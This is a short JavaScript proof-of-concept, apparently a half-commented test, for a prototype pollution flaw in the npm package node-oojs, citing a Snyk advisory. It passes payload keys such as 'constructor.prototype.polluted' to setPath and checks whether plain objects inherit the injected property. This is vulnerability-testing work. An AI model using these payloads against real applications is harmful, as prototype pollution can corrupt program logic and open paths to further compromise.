// // https://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
// test("prototype pollution in node-oojs", () => {
console.log({}.polluted);

  require("node-oojs");
  //oojs.setPath({ "__proto__.polluted": "yes" });
  oojs.setPath({ "constructor.prototype.polluted": "yes" });
  if({}.polluted != undefined){
	console.log("yes")
  }else{
	console.log(undefined)
  }
  // console.log({}.polluted)
  //expect({}.polluted).not.toBe(undefined);
// });
